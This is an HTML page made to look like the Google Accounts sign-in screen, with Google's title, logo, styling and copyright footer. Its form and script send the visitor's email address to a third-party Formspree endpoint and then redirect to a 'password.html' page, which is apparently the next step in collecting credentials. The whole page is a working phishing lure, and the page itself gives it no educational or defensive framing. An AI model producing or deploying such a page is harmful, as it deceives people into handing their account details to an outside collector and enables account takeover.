<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in - Google Accounts</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0; padding: 0;
    display: flex; justify-content: center; align-items: center;
    height: 100vh;
    color: #202124;
  }
  .container {
    background: white;
    border-radius: 8px;
    box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
    width: 360px;
    padding: 40px 40px 24px;
    box-sizing: border-box;
  }
  .logo {
    margin-bottom: 24px;
    text-align: center;
  }
  .logo img {
    width: 75px;
  }
  h1 {
    font-weight: 400;
    font-size: 24px;
    margin: 0 0 20px;
    text-align: left;
  }
  label {
    font-size: 14px;
    color: #3c4043;
    display: block;
    margin-bottom: 6px;
    font-weight: 500;
  }
  input[type="email"] {
    font-size: 16px;
    width: 100%;
    padding: 10px 12px;
    border-radius: 4px;
    border: 1px solid #dadce0;
    box-sizing: border-box;
    margin-bottom: 16px;
  }
  button {
    background-color: #1a73e8;
    border: none;
    color: white;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 500;
    border-radius: 4px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #155ab6;
  }
  .footer {
    font-size: 12px;
    color: #5f6368;
    margin-top: 24px;
    text-align: center;
  }
  .help-text {
    font-size: 14px;
    margin-top: 12px;
    color: #3c4043;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" />
    </div>
    <h1>Sign in</h1>
    <form method="POST" action="https://formspree.io/f/mzzvyyqv" id="emailForm">
      <label for="email">Email or phone</label>
      <input type="email" id="email" name="email" required autofocus autocomplete="username" />
      <button type="submit">Next</button>
    </form>
    <div class="help-text">
      <a href="#">Forgot email?</a>
    </div>
    <div class="footer">Â© 2025 Google LLC</div>
  </div>

  <script>
    const form = document.getElementById('emailForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = new FormData(form);
      try {
        const response = await fetch(form.action, {
          method: 'POST',
          body: formData,
          headers: {
            'Accept': 'application/json'
          }
        });

        const contentType = response.headers.get('content-type') || '';
        if (response.ok && contentType.includes('application/json')) {
          window.location.href = 'password.html';
        } else {
          alert('Oops! There was a problem submitting your form.');
        }
      } catch (error) {
        alert('Oops! There was a problem submitting your form.');
      }
    });
  </script>
</body>
</html>
